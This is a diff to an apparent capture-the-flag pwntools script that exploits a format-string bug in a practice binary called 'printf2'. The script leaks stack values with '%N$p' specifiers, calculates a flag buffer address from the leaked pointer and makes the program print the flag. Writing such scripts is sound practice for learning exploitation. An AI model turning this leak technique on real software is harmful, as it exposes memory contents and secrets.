@@ -6,6 +6,7 @@ from pwn import *
 
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF(args.EXE or '../src/printf2')
+context.terminal = ["alacritty", "-e"]
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -56,6 +57,7 @@ def start(argv=[], *a, **kw):
 # ./exploit.py GDB
 gdbscript = '''
 tbreak main
+b *vuln+229
 continue
 '''.format(**locals())
 
@@ -70,16 +72,33 @@ continue
 # Stripped:   No
 # Debuginfo:  Yes
 
+# finding flag
+#vars = []
+#for i in range(1, 40):
+#    io = start()
+#
+#    io.recvuntil(b"time: ")
+#    io.sendline(f"%{i}$p".encode('ascii'))
+#    data = io.recvuntil(b"Where", drop=True).decode('ascii')
+#
+#    io.info(f"{i}th stack var: {data}")
+#    io.close()
+
+# -- exploit --
 io = start()
 
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
+io.recvuntil(b"time: ")
+io.sendline(b"%14$p" if args.LOCAL else b"%18$p")
+io.recvuntil(b"said: ")
+flag_buffer = int(io.recvuntil(b"Where", drop=True).decode('ascii'), 16) - 28
 
-io.interactive()
+io.recvuntil(b"from? ")
+io.sendline(f"{flag_buffer}".encode('ascii'))
+io.recvuntil(b"interesting: ")
+flag = io.recvall()
+if not flag:
+    exit(1)
+flag = flag.decode('ascii')
+
+io.success(f"Flag is: {flag}")
 
